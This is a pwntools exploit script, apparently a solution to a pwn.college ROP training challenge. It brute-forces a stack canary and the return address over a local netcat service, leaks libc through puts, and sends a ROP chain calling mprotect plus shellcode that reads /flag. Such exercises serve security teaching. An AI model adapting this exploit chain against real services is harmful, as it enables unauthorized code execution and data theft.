from pwn import *

e = ELF('./babyrop_level14_teaching1')
libc = ELF('../libc6_2.31-0ubuntu9.2_amd64.so')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../key',port=22)

p = s.shell('/bin/sh')

with open('remote.py', 'r') as f:
    payload = f.read()
p.sendline(f'cd /tmp && echo "{payload}" > run.py && python -u run.py')

p.interactive()
exit(0)

# context.log_level = 0

# P = s.run('/babyrop_level14_teaching1')
# P.recvuntil(b'connections.\n')

# s.interactive()

'''
EXTRACT CANARY
'''

# canary = b'\x00G\xe3`\xe0\xcf\x1f\x94'
canary = b'\x00'

while len(canary) < 8:
    for i in range(256):
        if i == 0x10:continue
        print(i)
        # context.log_level = 20
        p = s.process(['nc','localhost','1337'])
        # context.log_level = 0
        pid = p.pid

        pay = b'A' * 0x18 + canary + bytes([i])
        p.send(pay)

        p.recvuntil(b'Goodbye!\n')
        if b'stack' not in p.recv():
            canary += bytes([i])
            print(canary)
            break

        p.close()
        s.kill(['-9',str(pid)])

    p.close()
    s.kill(['-9',str(pid)])

RET = b'\x02'

for i in range(16):
    print(i)
    p = s.process(['nc','localhost','1337'])
    pid = p.pid
    pay = b'A' * 0x18 + canary + p64(0) + RET + bytes([(i << 4) | 9])

    p.send(pay)

    p.recvuntil(b'Goodbye!\n')

    if b'Exiting!\n' in p.recv(timeout=1):
        RET += bytes([(i << 4) | 9])
        break

    p.close()
    s.kill(['-9',str(pid)])

p.close()
s.kill(['-9',str(pid)])

context.log_level = 0
print(RET)

while len(RET) < 5:
    for i in range(256):
        if i == 0x10:continue
        print(i)
        p = s.process(['nc','localhost','1337'])
        
        pid = p.pid
        pay = b'A' * 0x18 + canary + p64(0) + RET + bytes([i])

        p.send(pay)

        p.recvuntil(b'Goodbye!\n')

        if b'Exiting!\n' in p.recv(timeout=1):
            RET += bytes([i])
            break

        p.close()
        s.kill(['-9',str(pid)])

    p.close()
    s.kill(['-9',str(pid)])

    print(RET[::-1].hex())
    print(RET)

pie = u64(RET + b'\x55\x00\x00') - 0x2902
e.address = pie

rdi = 0x0000000000002983 + pie

p = s.process(['nc','localhost','1337'])
        
pid = p.pid
pay = b'A' * 0x18 + canary + p64(0) + p64(rdi) + p64(e.got['puts']) + p64(e.plt['puts'])

p.send(pay)

p.recvuntil(b'Goodbye!\n')
base = u64(p.recvline().strip()+b'\x00\x00') - libc.symbols['puts']
libc.address = base

print(hex(base))
p.close()
s.kill(['-9',str(pid)])

# base = 0x7f3f9c283000

p = s.process(['nc','localhost','1337'])
pid= p.pid

rsi = 0x0000000000027529 + base
rcx = 0x000000000009f822 + base
rdx_r12 = 0x000000000011c371 + base

pay = b'/flag\x00' + b'A' * 0x12 + canary + p64(0)
pay += p64(rdi) + p64(0) + p64(rsi) + p64(e.bss() + 0x100) + p64(rdx_r12) + p64(0x100) + p64(0) + p64(libc.symbols['read'])
pay += p64(rdi) + p64((e.bss() + 0x100)&0xFFFFFFFFFFFFF000) + p64(rsi) + p64(0x1000) + p64(0) + p64(libc.symbols['mprotect'])
pay += p64(e.bss() + 0x100)
pay = pay.ljust(0x1000, b'\x00')
# pay += p64(rdi) + p64(0x7ffcbb339318) + p64(rsi) + p64(0) + p64(libc.symbols['open'])
# pay += p64(rdi) + p64(e.bss()+0x100) + p64(0x00000000001621e2+ base)
# pay += p64(rdi) + p64(1) + p64(rsi) + p64(3) +  p64(rdx_r12) + p64(0) + p64(0) + p64(rcx) + p64(100) + p64(libc.symbols['sendfile'])
# pay += p64(rdi) + p64(0) + p64(rsi) + p64(0x7ffcbb339318) + p64(rdx_r12) + p64(0x8) + p64(0) + p64(libc.symbols['write'])

context.os = e.os
context.arch = e.arch

pay += asm(shellcraft.open("/flag\x00",0))
pay += asm(shellcraft.sendfile(1, "rax", 0, 0x1000))

p.send(pay)

p.interactive()

# p.send(b'/flag')

p = s.shell('/bin/sh')

p.sendline(b'cd /tmp && printf \'' + pay + b'\'> out.txt')
p.sendline(b'nc localhost 1337 < out.txt')
print(pay)

p.interactive()